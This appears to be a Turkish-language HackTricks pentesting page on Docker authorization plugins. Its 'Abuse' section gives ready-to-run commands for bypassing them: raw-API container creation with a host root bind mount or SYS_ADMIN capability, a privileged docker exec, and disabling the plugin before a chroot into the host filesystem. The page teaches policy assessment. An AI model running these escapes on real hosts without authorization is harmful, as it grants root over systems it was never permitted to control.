# Runtime Yetkilendirme Eklentileri

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Runtime authorization plugins, bir caller'ın belirli bir daemon işlemini gerçekleştirip gerçekleştiremeyeceğine karar veren ek bir policy katmanıdır. Docker bunun klasik örneğidir. Varsayılan olarak Docker daemon ile iletişim kurabilen herkes, pratikte daemon üzerinde geniş bir kontrole sahiptir. Authorization plugins, authenticated user'ı ve istenen API operation'ını inceleyerek, ardından policy'ye göre request'i allow veya deny ederek bu modeli daraltmaya çalışır.

Bu konuya ayrı bir sayfa ayrılması gerekir; çünkü attacker'ın zaten bir Docker API'ye veya `docker` grubundaki bir user'a erişimi olduğunda exploitation modelini değiştirir. Bu tür ortamlarda soru artık yalnızca "daemon'a ulaşabilir miyim?" değildir; aynı zamanda "daemon bir authorization layer tarafından sınırlandırılmış mı ve eğer öyleyse bu layer, işlenmemiş endpoint'ler, zayıf JSON parsing veya plugin-management permissions üzerinden bypass edilebilir mi?" sorusudur.

## Çalışma Şekli

Bir request Docker daemon'a ulaştığında authorization subsystem, request context'ini kurulu bir veya daha fazla plugin'e iletebilir. Plugin; authenticated user identity'ı, request details'ı, seçili header'ları ve content type uygun olduğunda request veya response body'nin bazı bölümlerini görür. Birden fazla plugin zincirlenebilir ve access yalnızca tüm plugin'ler request'e izin verirse grant edilir.

Bu model güçlü görünse de güvenliği tamamen policy author'ın API'yi ne kadar eksiksiz anladığına bağlıdır. `docker run --privileged` işlemini block eden ancak `docker exec`'i gözden kaçıran, top-level `Binds` gibi alternatif JSON key'lerini atlayan veya plugin administration'a izin veren bir plugin, doğrudan privilege-escalation path'lerini hâlâ açık bırakırken kısıtlama konusunda yanlış bir güven hissi oluşturabilir.

## Yaygın Plugin Hedefleri

Policy review için önemli alanlar şunlardır:

- container creation endpoint'leri
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` gibi `HostConfig` field'ları ve namespace-sharing seçenekleri
- `docker exec` davranışı
- plugin management endpoint'leri
- amaçlanan policy modelinin dışında runtime action'larını dolaylı olarak tetikleyebilen tüm endpoint'ler

Geçmişte Twistlock'un `authz` plugin'i ve `authobot` gibi basit educational plugin'ler, policy file'ları ve code path'leri endpoint-to-action mapping'in gerçekte nasıl uygulandığını gösterdiği için bu modeli incelemeyi kolaylaştırdı. Assessment çalışmaları için önemli ders, policy author'ın yalnızca en görünür CLI command'larını değil, API surface'ın tamamını anlaması gerektiğidir.

## Abuse

İlk hedef, gerçekte neyin block edildiğini öğrenmektir. Daemon bir action'ı deny ederse error çoğu zaman kullanılan control'ü tanımlamaya yardımcı olan plugin name'ini leak eder:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Daha kapsamlı endpoint profillemesine ihtiyacınız varsa, `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü aksi hâlde tekrarlanacak olan, plugin tarafından hangi API rotalarına ve JSON yapılarına gerçekten izin verildiğini kontrol etme görevini otomatikleştirir.

Ortamda özel bir plugin kullanılıyorsa ve API ile etkileşim kurabiliyorsanız, hangi nesne alanlarının gerçekten filtrelendiğini listeleyin:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Bu kontroller önemlidir; çünkü birçok authorization hatası kavramdan ziyade alana özgüdür. Bir plugin, eşdeğer API yapısını tamamen engellemeden bir CLI pattern'ini reddedebilir.

### Tam Örnek: `docker exec`, Container Oluşturulduktan Sonra Privilege Ekler

Privileged container oluşturmayı engelleyen ancak unconfined container oluşturulmasına ve `docker exec` kullanımına izin veren bir policy yine de bypass edilebilir:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Daemon ikinci adımı kabul ederse kullanıcı, politika yazarının kısıtlandığına inandığı bir container içinde ayrıcalıklı bir etkileşimli işlemi geri kazanmış olur.

### Full Example: Bind Mount Through Raw API

Bazı hatalı politikalar yalnızca tek bir JSON biçimini inceler. Root filesystem bind mount işlemi tutarlı bir şekilde engellenmezse host yine mount edilebilir:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Aynı fikir `HostConfig` altında da görülebilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Etki, ana makinenin dosya sisteminden tamamen kaçıştır. İlginç ayrıntı, bypass işleminin bir kernel bug'ından değil, politikanın eksik kapsamından kaynaklanmasıdır.

### Tam Örnek: Denetlenmeyen Capability Özniteliği

Policy, capability ile ilgili bir özniteliği filtrelemeyi unutursa attacker, tehlikeli bir capability'yi yeniden kazanan bir container oluşturabilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` veya benzer şekilde güçlü bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) içinde açıklanan birçok breakout tekniğine erişilebilir.

### Tam Örnek: Plugin'i Devre Dışı Bırakma

Plugin-management işlemlerine izin veriliyorsa en temiz bypass, kontrolü tamamen kapatmak olabilir:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Bu, control-plane düzeyinde bir policy hatasıdır. Authorization katmanı mevcut, ancak kısıtlaması gereken kullanıcı hâlâ bu katmanı devre dışı bırakma iznine sahip.

## Kontroller

Bu komutlar, bir policy katmanının mevcut olup olmadığını ve eksiksiz mi yoksa yüzeysel mi göründüğünü belirlemeyi amaçlar.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Burada ilginç olanlar:

- Bir plugin adı içeren denial mesajları, bir authorization katmanını doğrular ve genellikle tam implementation'ı açığa çıkarır.
- Attacker tarafından görülebilen bir plugin listesi, disable veya reconfigure işlemlerinin mümkün olup olmadığını keşfetmek için yeterli olabilir.
- Yalnızca bariz CLI işlemlerini engelleyen, ancak raw API isteklerini engellemeyen bir policy, aksi kanıtlanana kadar bypass edilebilir kabul edilmelidir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Bir authorization plugin yapılandırılmadığı sürece daemon erişimi pratikte all-or-nothing'dir | eksik plugin policy'si, allowlist yerine blacklist kullanılması, plugin yönetimine izin verilmesi, field-level blind spot'lar |
| Podman | Yaygın bir doğrudan eşdeğeri yok | Podman genellikle Docker tarzı authz plugin'leri yerine Unix permissions, rootless execution ve API exposure kararlarına daha fazla dayanır | rootful Podman API'sinin geniş şekilde açığa çıkarılması, zayıf socket permissions |
| containerd / CRI-O | Farklı bir kontrol modeli | Bu runtime'lar genellikle Docker authz plugin'leri yerine socket permissions, node trust boundary'leri ve üst katman orchestrator kontrollerine dayanır | socket'in workload'lara mount edilmesi, zayıf node-local trust varsayımları |
| Kubernetes | Docker authz plugin'leri yerine API-server ve kubelet katmanlarında authn/authz kullanır | Cluster RBAC ve admission kontrolleri ana policy katmanıdır | aşırı geniş RBAC, zayıf admission policy'si, kubelet veya runtime API'lerinin doğrudan açığa çıkarılması |

{{#include ../../../banners/hacktricks-training.md}}
